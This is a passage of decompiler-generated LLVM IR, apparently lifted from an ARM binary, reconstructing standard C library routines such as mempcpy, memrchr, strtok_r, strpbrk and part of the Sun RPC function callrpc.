  uselistorder i32 %v0_15fac37, { 1, 2, 0 }
  uselistorder i32 %v1_15ef4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_15ef0, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15fac.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15f30, { 1, 0 }
  uselistorder label %dec_label_pc_15f20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15f18, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_15ff8 = call i32 @memcpy()
  %v0_15ffc = load i32, i32* @r5, align 4
  %v1_15ffc = load i32, i32* @r4, align 4
  %v2_15ffc = add i32 %v1_15ffc, %v0_15ffc
  ret i32 %v2_15ffc
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_16004 = load i32, i32* @r4, align 4
  %v1_16008 = urem i32 %arg2, 256
  %v2_1600c = add i32 %arg3, %arg1
  %v2_160242 = icmp eq i32 %arg3, 0
  br i1 %v2_160242, label %dec_label_pc_16034, label %dec_label_pc_1602c

dec_label_pc_16014:                               ; preds = %dec_label_pc_1602c
  %v1_16014 = add i32 %v0_16014, -1
  %v2_16014 = inttoptr i32 %v1_16014 to i8*
  %v3_16014 = load i8, i8* %v2_16014, align 1
  %v4_16014 = zext i8 %v3_16014 to i32
  %v9_16018 = icmp eq i32 %v4_16014, %v1_16008
  br i1 %v9_16018, label %bb, label %dec_label_pc_16024

bb:                                               ; preds = %dec_label_pc_16014
  ret i32 %v1_16014

dec_label_pc_16024:                               ; preds = %dec_label_pc_16014
  %v1_16020 = add i32 %v0_16020, -1
  %v2_16024 = icmp eq i32 %v1_16020, 0
  br i1 %v2_16024, label %dec_label_pc_16034, label %dec_label_pc_1602c

dec_label_pc_1602c:                               ; preds = %entry, %dec_label_pc_16024
  %v0_16020 = phi i32 [ %v1_16020, %dec_label_pc_16024 ], [ %arg3, %entry ]
  %v0_16014 = phi i32 [ %v1_16014, %dec_label_pc_16024 ], [ %v2_1600c, %entry ]
  %v1_1602c = urem i32 %v0_16014, 4
  %v2_1602c = icmp eq i32 %v1_1602c, 0
  br i1 %v2_1602c, label %dec_label_pc_16034, label %dec_label_pc_16014

dec_label_pc_16034:                               ; preds = %dec_label_pc_16024, %dec_label_pc_1602c, %entry
  %v0_160cc11 = phi i32 [ %v2_1600c, %entry ], [ %v1_16014, %dec_label_pc_16024 ], [ %v0_16014, %dec_label_pc_1602c ]
  %v0_160b87 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_16024 ], [ %v0_16020, %dec_label_pc_1602c ]
  %v4_16034 = mul nuw nsw i32 %v1_16008, 256
  %v5_16034 = or i32 %v4_16034, %v1_16008
  %v4_16038 = mul i32 %v5_16034, 65536
  %v5_16038 = or i32 %v4_16038, %v5_16034
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_160b87, 3
  br i1 %tmp, label %dec_label_pc_16040, label %dec_label_pc_160c8

dec_label_pc_16040:                               ; preds = %dec_label_pc_16034, %.backedge.backedge
  %v0_1605c51 = phi i32 [ %v1_1605c, %.backedge.backedge ], [ %v0_160b87, %dec_label_pc_16034 ]
  %v0_1604050 = phi i32 [ %v1_16040, %.backedge.backedge ], [ %v0_160cc11, %dec_label_pc_16034 ]
  %v1_16040 = add i32 %v0_1604050, -4
  %v2_16040 = inttoptr i32 %v1_16040 to i32*
  %v3_16040 = load i32, i32* %v2_16040, align 4
  %v2_16044 = xor i32 %v3_16040, %v5_16038
  %v2_16048 = add i32 %v2_16044, 2130640639
  %v1_1604c = sub i32 -1, %v2_16044
  %v2_16050 = xor i32 %v2_16048, %v1_1604c
  %v2_16054 = and i32 %v2_16050, -2130640640
  %v2_16058 = icmp eq i32 %v2_16054, 0
  %v1_1605c = add i32 %v0_1605c51, -4
  br i1 %v2_16058, label %.backedge.backedge, label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_16040
  %v1_16064 = add i32 %v0_1604050, -1
  %v2_16064 = inttoptr i32 %v1_16064 to i8*
  %v3_16064 = load i8, i8* %v2_16064, align 1
  %v4_16064 = zext i8 %v3_16064 to i32
  %v9_16068 = icmp eq i32 %v4_16064, %v1_16008
  %v1_1606c = add i32 %v0_1604050, -2
  %v1_16074 = add i32 %v0_1604050, -3
  store i32 %v1_16074, i32* @lr, align 4
  br i1 %v9_16068, label %dec_label_pc_1607c, label %dec_label_pc_16084

dec_label_pc_1607c:                               ; preds = %dec_label_pc_16064
  store i32 %v3_16004, i32* @r4, align 4
  ret i32 %v1_16064

dec_label_pc_16084:                               ; preds = %dec_label_pc_16064
  %v2_16084 = inttoptr i32 %v1_1606c to i8*
  %v3_16084 = load i8, i8* %v2_16084, align 1
  %v4_16084 = zext i8 %v3_16084 to i32
  %v9_16088 = icmp eq i32 %v4_16084, %v1_16008
  br i1 %v9_16088, label %dec_label_pc_16090, label %dec_label_pc_16098

dec_label_pc_16090:                               ; preds = %dec_label_pc_16084
  store i32 %v3_16004, i32* @r4, align 4
  ret i32 %v1_1606c

dec_label_pc_16098:                               ; preds = %dec_label_pc_16084
  %v2_16098 = inttoptr i32 %v1_16074 to i8*
  %v3_16098 = load i8, i8* %v2_16098, align 1
  %v4_16098 = zext i8 %v3_16098 to i32
  %v9_1609c = icmp eq i32 %v4_16098, %v1_16008
  br i1 %v9_1609c, label %dec_label_pc_160a4, label %dec_label_pc_160ac

dec_label_pc_160a4:                               ; preds = %dec_label_pc_16098
  store i32 %v3_16004, i32* @r4, align 4
  ret i32 %v1_16074

dec_label_pc_160ac:                               ; preds = %dec_label_pc_16098
  %v1_160ac = inttoptr i32 %v1_16040 to i8*
  %v2_160ac = load i8, i8* %v1_160ac, align 1
  %v3_160ac = zext i8 %v2_160ac to i32
  %v9_160b0 = icmp eq i32 %v3_160ac, %v1_16008
  br i1 %v9_160b0, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_160ac, %dec_label_pc_16040
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1605c, 3
  br i1 %tmp70, label %dec_label_pc_16040, label %dec_label_pc_160c8

bb19:                                             ; preds = %dec_label_pc_160ac
  store i32 %v3_16004, i32* @r4, align 4
  ret i32 %v1_16040

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160c8
  %v1_160d8 = add i32 %v0_160d8, -1
  %v1_160cc = add i32 %v0_160cc, -1
  %v2_160cc = inttoptr i32 %v1_160cc to i8*
  %v3_160cc = load i8, i8* %v2_160cc, align 1
  %v4_160cc = zext i8 %v3_160cc to i32
  %v9_160d0 = icmp eq i32 %v4_160cc, %v1_16008
  br i1 %v9_160d0, label %bb20, label %dec_label_pc_160c8

bb20:                                             ; preds = %dec_label_pc_160cc
  store i32 %v3_16004, i32* @r4, align 4
  ret i32 %v1_160cc

dec_label_pc_160c8:                               ; preds = %dec_label_pc_16034, %.backedge.backedge, %dec_label_pc_160cc
  %v0_160cc = phi i32 [ %v1_160cc, %dec_label_pc_160cc ], [ %v0_160cc11, %dec_label_pc_16034 ], [ %v1_16040, %.backedge.backedge ]
  %v0_160d8 = phi i32 [ %v1_160d8, %dec_label_pc_160cc ], [ %v0_160b87, %dec_label_pc_16034 ], [ %v1_1605c, %.backedge.backedge ]
  %v2_160d8 = icmp eq i32 %v0_160d8, 0
  br i1 %v2_160d8, label %dec_label_pc_160e0, label %dec_label_pc_160cc

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160c8
  store i32 %v3_16004, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_160d8, { 1, 0 }
  uselistorder i32 %v1_1605c, { 1, 0, 2 }
  uselistorder i32 %v1_16040, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1604050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16034, { 1, 0 }
  uselistorder i32 %v0_160b87, { 1, 2, 0 }
  uselistorder i32 %v0_16014, { 1, 0, 2 }
  uselistorder i32 %v1_16014, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1600c, { 1, 0 }
  uselistorder i32 %v1_16008, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_16004, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_160c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16040, { 1, 0 }
  uselistorder label %dec_label_pc_16034, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1602c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_160f0 = load i32, i32* @r4, align 4
  store i32 %v3_160f0, i32* %stack_var_-16, align 4
  %v6_160f0 = load i32, i32* @r5, align 4
  %v0_160f4 = load i32, i32* @r0, align 4
  store i32 %v0_160f4, i32* %r4.global-to-local, align 4
  %v2_160f4 = icmp eq i32 %v0_160f4, 0
  %v1_160f8 = load i32, i32* @r2, align 4
  br i1 %v2_160f4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_160f8 = inttoptr i32 %v1_160f8 to i32*
  %v3_160f8 = load i32, i32* %v2_160f8, align 4
  store i32 %v3_160f8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_160fc = phi i32 [ %v3_160f8, %bb ], [ %v0_160f4, %entry ]
  store i32 %v0_160fc, i32* @r0, align 4
  store i32 %v1_160f8, i32* @r5, align 4
  %v0_16104 = load i32, i32* @r1, align 4
  store i32 %v0_16104, i32* %r6.global-to-local, align 4
  %v1_16108 = inttoptr i32 %v0_160fc to i8*
  %v2_16108 = call i32 @__GI_strspn(i8* %v1_16108)
  %v0_1610c = load i32, i32* %r4.global-to-local, align 4
  %v2_1610c = add i32 %v0_1610c, %v2_16108
  %v3_1610c = inttoptr i32 %v2_1610c to i8*
  %v4_1610c = load i8, i8* %v3_1610c, align 1
  %v6_1610c = zext i8 %v4_1610c to i32
  store i32 %v6_1610c, i32* %r3.global-to-local, align 4
  store i32 %v2_1610c, i32* @r4, align 4
  %v2_16114 = icmp eq i8 %v4_1610c, 0
  %v0_16118 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16118, i32* @r1, align 4
  store i32 %v2_1610c, i32* @r0, align 4
  br i1 %v2_16114, label %bb7, label %dec_label_pc_16128

bb7:                                              ; preds = %entry._crit_edge
  %v2_16120 = load i32, i32* @r5, align 4
  %v3_16120 = inttoptr i32 %v2_16120 to i32*
  store i32 %v2_1610c, i32* %v3_16120, align 4
  br label %dec_label_pc_1615c

dec_label_pc_16128:                               ; preds = %entry._crit_edge
  %v0_16128 = call i32 @__GI_strpbrk()
  store i32 %v0_16128, i32* %r2.global-to-local, align 4
  %v3_1612c = icmp eq i32 %v0_16128, 0
  br i1 %v3_1612c, label %dec_label_pc_1613c, label %dec_label_pc_1614c

dec_label_pc_1613c:                               ; preds = %dec_label_pc_16128
  %v0_16134 = load i32, i32* @r4, align 4
  %v2_1613c = call i32 @rawmemchr(i32 %v0_16134, i32 0)
  %v0_16140 = load i32, i32* @r4, align 4
  store i32 %v0_16140, i32* %r3.global-to-local, align 4
  %v1_16144 = load i32, i32* @r5, align 4
  %v2_16144 = inttoptr i32 %v1_16144 to i32*
  store i32 %v2_1613c, i32* %v2_16144, align 4
  br label %dec_label_pc_1615c

dec_label_pc_1614c:                               ; preds = %dec_label_pc_16128
  %v3_16150 = inttoptr i32 %v0_16128 to i8*
  store i8 0, i8* %v3_16150, align 1
  %v4_16150 = load i32, i32* %r2.global-to-local, align 4
  %v5_16150 = add i32 %v4_16150, 1
  store i32 %v5_16150, i32* %r2.global-to-local, align 4
  %v1_16154 = load i32, i32* @r5, align 4
  %v2_16154 = inttoptr i32 %v1_16154 to i32*
  store i32 %v5_16150, i32* %v2_16154, align 4
  %v0_16158 = load i32, i32* @r4, align 4
  store i32 %v0_16158, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1615c

dec_label_pc_1615c:                               ; preds = %bb7, %dec_label_pc_1613c, %dec_label_pc_1614c
  %v0_1615c = load i32, i32* %r3.global-to-local, align 4
  %v2_16160 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16160, i32* @r4, align 4
  store i32 %v6_160f0, i32* @r5, align 4
  ret i32 %v0_1615c

; uselistorder directives
  uselistorder i32 %v0_160fc, { 1, 0 }
  uselistorder i32 %v0_160f4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1615c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_16164 = load i32, i32* @r0, align 4
  %v1_161882 = inttoptr i32 %v0_16164 to i8*
  %v2_161883 = load i8, i8* %v1_161882, align 1
  %v3_161884 = zext i8 %v2_161883 to i32
  %v2_1618c5 = icmp eq i8 %v2_161883, 0
  br i1 %v2_1618c5, label %dec_label_pc_16188._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_16194.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_1616c:                               ; preds = %dec_label_pc_16174
  %v1_1617c = add i32 %v0_1617c, 1
  %v9_1616c = icmp eq i32 %v3_16174, %v3_161886
  br i1 %v9_1616c, label %dec_label_pc_1619c, label %dec_label_pc_16174

dec_label_pc_16174:                               ; preds = %dec_label_pc_1616c, %bb
  %v0_1617c = phi i32 [ %v1_1617c, %dec_label_pc_1616c ], [ %v0_16194.pre, %bb ]
  %v1_16174 = inttoptr i32 %v0_1617c to i8*
  %v2_16174 = load i8, i8* %v1_16174, align 1
  %v3_16174 = zext i8 %v2_16174 to i32
  store i32 %v3_16174, i32* @ip, align 4
  %v2_16178 = icmp eq i8 %v2_16174, 0
  br i1 %v2_16178, label %dec_label_pc_16184, label %dec_label_pc_1616c

dec_label_pc_16184:                               ; preds = %dec_label_pc_16174
  %v1_16184 = add i32 %v0_16184, 1
  %v1_16188 = inttoptr i32 %v1_16184 to i8*
  %v2_16188 = load i8, i8* %v1_16188, align 1
  %v3_16188 = zext i8 %v2_16188 to i32
  %v2_1618c = icmp eq i8 %v2_16188, 0
  br i1 %v2_1618c, label %dec_label_pc_16188._crit_edge, label %bb

dec_label_pc_16188._crit_edge:                    ; preds = %dec_label_pc_16184, %entry
  %v3_16188.lcssa = phi i32 [ %v3_161884, %entry ], [ %v3_16188, %dec_label_pc_16184 ]
  ret i32 %v3_16188.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_16184
  %v0_16184 = phi i32 [ %v0_16164, %.lr.ph ], [ %v1_16184, %dec_label_pc_16184 ]
  %v3_161886 = phi i32 [ %v3_161884, %.lr.ph ], [ %v3_16188, %dec_label_pc_16184 ]
  br label %dec_label_pc_16174

dec_label_pc_1619c:                               ; preds = %dec_label_pc_1616c
  ret i32 %v0_16184

; uselistorder directives
  uselistorder i32 %v3_16188, { 1, 0 }
  uselistorder i32 %v3_16174, { 1, 0 }
  uselistorder i32 %v0_1617c, { 1, 0 }
  uselistorder i32 %v3_161884, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_16174, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_161a4 = load i32, i32* @r4, align 4
  store i32 %v3_161a4, i32* %stack_var_-8, align 4
  %v6_161a4 = load i32, i32* @lr, align 4
  %v0_161a8 = call i32 @__rpc_thread_variables()
  %v1_161ac = add i32 %v0_161a8, 164
  %v2_161ac = inttoptr i32 %v1_161ac to i32*
  %v3_161ac = load i32, i32* %v2_161ac, align 4
  store i32 %v3_161ac, i32* %r4.global-to-local, align 4
  %v2_161b0 = icmp eq i32 %v3_161ac, 0
  br i1 %v2_161b0, label %bb, label %bb5

bb:                                               ; preds = %entry
  %v3_161b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_161b4, i32* @r4, align 4
  ret i32 %v0_161a8

bb5:                                              ; preds = %entry
  %v1_161b8 = inttoptr i32 %v3_161ac to i32*
  %v2_161b8 = load i32, i32* %v1_161b8, align 4
  %v2_161bc = icmp eq i32 %v2_161b8, 0
  br i1 %v2_161bc, label %.thread1, label %bb6

bb6:                                              ; preds = %bb5
  %v2_161c4 = add i32 %v2_161b8, 4
  %v3_161c4 = inttoptr i32 %v2_161c4 to i32*
  %v4_161c4 = load i32, i32* %v3_161c4, align 4
  %v2_161cc = add i32 %v4_161c4, 16
  %v3_161cc = inttoptr i32 %v2_161cc to i32*
  %v4_161cc = load i32, i32* %v3_161cc, align 4
  call void @__pseudo_branch(i32 %v4_161cc)
  %v0_161d0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb5, %bb6
  %v0_161d0 = phi i32 [ %v3_161ac, %bb5 ], [ %v0_161d0.pre, %bb6 ]
  store i32 %v0_161d0, i32* @r0, align 4
  %v2_161d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_161d4, i32* @r4, align 4
  store i32 %v6_161a4, i32* @lr, align 4
  %v0_161d8 = call i32 @free()
  ret i32 %v0_161d8

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-1132 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v21_161e0 = load i32, i32* @sl, align 4
  store i32 90600, i32* %stack_var_-4, align 4
  %v2_161e4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_161e4, i32* @fp, align 4
  %v0_161fc = call i32 @__rpc_thread_variables()
  store i32 %v0_161fc, i32* %r0.global-to-local, align 4
  %v1_16200 = add i32 %v0_161fc, 164
  %v2_16200 = inttoptr i32 %v1_16200 to i32*
  %v3_16200 = load i32, i32* %v2_16200, align 4
  store i32 %v3_16200, i32* @r5, align 4
  store i32 0, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  %v2_1620c = icmp eq i32 %v3_16200, 0
  store i32 %v0_161fc, i32* @r4, align 4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @sl, align 4
  br i1 %v2_1620c, label %dec_label_pc_16220, label %dec_label_pc_1623c

dec_label_pc_16220:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_16228 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_16228, i32* %r0.global-to-local, align 4
  store i32 %v2_16228, i32* @r5, align 4
  %v2_1622c = icmp eq i32 %v2_16228, 0
  br i1 %v2_1622c, label %bb, label %dec_label_pc_16238

bb:                                               ; preds = %dec_label_pc_16220
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16440

dec_label_pc_16238:                               ; preds = %dec_label_pc_16220
  %v1_16238 = load i32, i32* @r4, align 4
  %v2_16238 = add i32 %v1_16238, 164
  %v3_16238 = inttoptr i32 %v2_16238 to i32*
  store i32 %v2_16228, i32* %v3_16238, align 4
  %v0_1623c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1623c

dec_label_pc_1623c:                               ; preds = %entry, %dec_label_pc_16238
  %v0_1623c = phi i32 [ %v3_16200, %entry ], [ %v0_1623c.pre, %dec_label_pc_16238 ]
  %v1_1623c = add i32 %v0_1623c, 20
  %v2_1623c = inttoptr i32 %v1_1623c to i32*
  %v3_1623c = load i32, i32* %v2_1623c, align 4
  store i32 %v3_1623c, i32* @r4, align 4
  %v2_16240 = icmp eq i32 %v3_1623c, 0
  br i1 %v2_16240, label %dec_label_pc_16248, label %dec_label_pc_16260

dec_label_pc_16248:                               ; preds = %dec_label_pc_1623c
  store i32 256, i32* %r0.global-to-local, align 4
  %v1_1624c = call i32 @malloc(i32 256)
  %v2_1624c = inttoptr i32 %v1_1624c to i8*
  store i32 %v1_1624c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_16254 = load i32, i32* @r5, align 4
  %v3_16254 = add i32 %v2_16254, 20
  %v4_16254 = inttoptr i32 %v3_16254 to i32*
  store i32 %v1_1624c, i32* %v4_16254, align 4
  %v0_16258 = load i32, i32* @r4, align 4
  %v1_16258 = trunc i32 %v0_16258 to i8
  store i8 %v1_16258, i8* %v2_1624c, align 1
  %v0_1625c = load i32, i32* %r3.global-to-local, align 4
  %v1_1625c = load i32, i32* @r5, align 4
  %v2_1625c = add i32 %v1_1625c, 4
  %v3_1625c = inttoptr i32 %v2_1625c to i32*
  store i32 %v0_1625c, i32* %v3_1625c, align 4
  %v0_16260.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16260

dec_label_pc_16260:                               ; preds = %dec_label_pc_1623c, %dec_label_pc_16248
  %v0_1628c = phi i32 [ %v0_1623c, %dec_label_pc_1623c ], [ %v0_16260.pre, %dec_label_pc_16248 ]
  %v1_16260 = add i32 %v0_1628c, 16
  %v2_16260 = inttoptr i32 %v1_16260 to i32*
  %v3_16260 = load i32, i32* %v2_16260, align 4
  store i32 %v3_16260, i32* %r3.global-to-local, align 4
  %v2_16264 = icmp eq i32 %v3_16260, 0
  br i1 %v2_16264, label %dec_label_pc_162a0, label %dec_label_pc_1626c

dec_label_pc_1626c:                               ; preds = %dec_label_pc_16260
  %v1_1626c = add i32 %v0_1628c, 8
  %v2_1626c = inttoptr i32 %v1_1626c to i32*
  %v3_1626c = load i32, i32* %v2_1626c, align 4
  store i32 %v3_1626c, i32* %r3.global-to-local, align 4
  %v9_16274 = icmp eq i32 %v3_1626c, %arg2
  br i1 %v9_16274, label %dec_label_pc_1627c, label %dec_label_pc_162a0

dec_label_pc_1627c:                               ; preds = %dec_label_pc_1626c
  %v1_1627c = add i32 %v0_1628c, 12
  %v2_1627c = inttoptr i32 %v1_1627c to i32*
  %v3_1627c = load i32, i32* %v2_1627c, align 4
  store i32 %v3_1627c, i32* %r3.global-to-local, align 4
  %v9_16284 = icmp eq i32 %v3_1627c, %arg3
  br i1 %v9_16284, label %dec_label_pc_1628c, label %dec_label_pc_162a0

dec_label_pc_1628c:                               ; preds = %dec_label_pc_1627c
  %v1_1628c = add i32 %v0_1628c, 20
  %v2_1628c = inttoptr i32 %v1_1628c to i32*
  %v3_1628c = load i32, i32* %v2_1628c, align 4
  store i32 %v3_1628c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_16294 = inttoptr i32 %v3_1628c to i8*
  %v3_16294 = call i32 @__GI_strcoll(i8* %v2_16294, i32 %arg1)
  store i32 %v3_16294, i32* %r0.global-to-local, align 4
  %v2_16298 = icmp eq i32 %v3_16294, 0
  br i1 %v2_16298, label %dec_label_pc_163f4, label %dec_label_pc_1628c.dec_label_pc_162a0_crit_edge

dec_label_pc_1628c.dec_label_pc_162a0_crit_edge:  ; preds = %dec_label_pc_1628c
  %v0_162a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_162a0

dec_label_pc_162a0:                               ; preds = %dec_label_pc_1628c.dec_label_pc_162a0_crit_edge, %dec_label_pc_1627c, %dec_label_pc_1626c, %dec_label_pc_16260
  %v1_162ac = phi i32 [ %v0_162a0.pre, %dec_label_pc_1628c.dec_label_pc_162a0_crit_edge ], [ %v0_1628c, %dec_label_pc_1627c ], [ %v0_1628c, %dec_label_pc_1626c ], [ %v0_1628c, %dec_label_pc_16260 ]
  %v1_162a0 = add i32 %v1_162ac, 4
  %v2_162a0 = inttoptr i32 %v1_162a0 to i32*
  %v3_162a0 = load i32, i32* %v2_162a0, align 4
  store i32 %v3_162a0, i32* @r0, align 4
  store i32 0, i32* @r4, align 4
  %v7_162a8 = icmp eq i32 %v3_162a0, -1
  %v2_162ac = add i32 %v1_162ac, 16
  %v3_162ac = inttoptr i32 %v2_162ac to i32*
  store i32 0, i32* %v3_162ac, align 4
  br i1 %v7_162a8, label %dec_label_pc_162c0, label %dec_label_pc_162b4

dec_label_pc_162b4:                               ; preds = %dec_label_pc_162a0
  %v1_162b4 = call i32 @__libc_close(i32 %v3_162a0)
  store i32 %v1_162b4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_162bc = load i32, i32* @r5, align 4
  %v2_162bc = add i32 %v1_162bc, 4
  %v3_162bc = inttoptr i32 %v2_162bc to i32*
  store i32 -1, i32* %v3_162bc, align 4
  br label %dec_label_pc_162c0

dec_label_pc_162c0:                               ; preds = %dec_label_pc_162a0, %dec_label_pc_162b4
  %v0_162c0 = load i32, i32* @r5, align 4
  %v1_162c0 = inttoptr i32 %v0_162c0 to i32*
  %v2_162c0 = load i32, i32* %v1_162c0, align 4
  store i32 %v2_162c0, i32* %r3.global-to-local, align 4
  %v2_162c4 = icmp eq i32 %v2_162c0, 0
  br i1 %v2_162c4, label %dec_label_pc_162e0, label %dec_label_pc_162cc

dec_label_pc_162cc:                               ; preds = %dec_label_pc_162c0
  store i32 %v2_162c0, i32* %r0.global-to-local, align 4
  %v1_162d0 = add i32 %v2_162c0, 4
  %v2_162d0 = inttoptr i32 %v1_162d0 to i32*
  %v3_162d0 = load i32, i32* %v2_162d0, align 4
  store i32 %v3_162d0, i32* %r3.global-to-local, align 4
  store i32 90844, i32* @lr, align 4
  %v1_162d8 = add i32 %v3_162d0, 16
  %v2_162d8 = inttoptr i32 %v1_162d8 to i32*
  %v3_162d8 = load i32, i32* %v2_162d8, align 4
  call void @__pseudo_branch(i32 %v3_162d8)
  %v0_162dc = load i32, i32* @r4, align 4
  %v1_162dc = load i32, i32* @r5, align 4
  %v2_162dc = inttoptr i32 %v1_162dc to i32*
  store i32 %v0_162dc, i32* %v2_162dc, align 4
  br label %dec_label_pc_162e0

dec_label_pc_162e0:                               ; preds = %dec_label_pc_162c0, %dec_label_pc_162cc
  %v2_162e8 = ptrtoint i32* %stack_var_-1132 to i32
  store i32 1024, i32* @r4, align 4
  br label %dec_label_pc_16320

dec_label_pc_162f4:                               ; preds = %dec_label_pc_16320, %dec_label_pc_1634c
  %v3_162f4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_162f4, i32* %r3.global-to-local, align 4
  %v3_162f8 = icmp eq i32 %v3_162f4, -1
  br i1 %v3_162f8, label %dec_label_pc_16300, label %dec_label_pc_1643c

dec_label_pc_16300:                               ; preds = %dec_label_pc_162f4
  %v0_16300 = call i32 @__errno_location()
  store i32 %v0_16300, i32* %r0.global-to-local, align 4
  %v1_16304 = inttoptr i32 %v0_16300 to i32*
  %v2_16304 = load i32, i32* %v1_16304, align 4
  store i32 %v2_16304, i32* %r3.global-to-local, align 4
  %v7_16308 = icmp eq i32 %v2_16304, 34
  br i1 %v7_16308, label %dec_label_pc_16310, label %dec_label_pc_1643c

dec_label_pc_16310:                               ; preds = %dec_label_pc_16300
  %v0_16310 = load i32, i32* @r4, align 4
  %v1_16310 = add i32 %v0_16310, 6
  %v1_16314 = and i32 %v1_16310, -4
  store i32 %v1_16314, i32* %r3.global-to-local, align 4
  %v1_16318 = load i32, i32* @sp, align 4
  %v2_16318 = sub i32 %v1_16318, %v1_16314
  %v1_1631c = add i32 %v2_16318, 16
  br label %dec_label_pc_16320

dec_label_pc_16320:                               ; preds = %dec_label_pc_162e0, %dec_label_pc_16310
  %v2_1633c = phi i32 [ %v2_162e8, %dec_label_pc_162e0 ], [ %v1_1631c, %dec_label_pc_16310 ]
  %v0_16324 = phi i32 [ 1024, %dec_label_pc_162e0 ], [ %v0_16310, %dec_label_pc_16310 ]
  store i32 %v0_16324, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v7_1633c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_1633c, i32 %v0_16324, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1633c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v7_1633c, 16777216
  %v1_16340 = sdiv i32 %sext, 16777216
  store i32 %v1_16340, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  %v0_16344 = load i32, i32* @r4, align 4
  %v2_16344 = mul i32 %v0_16344, 2
  store i32 %v2_16344, i32* @r4, align 4
  br i1 %tmp, label %dec_label_pc_1634c, label %dec_label_pc_162f4

dec_label_pc_1634c:                               ; preds = %dec_label_pc_16320
  %v3_1634c = load i32, i32* %stack_var_-48, align 4
  %v2_16350 = icmp eq i32 %v3_1634c, 0
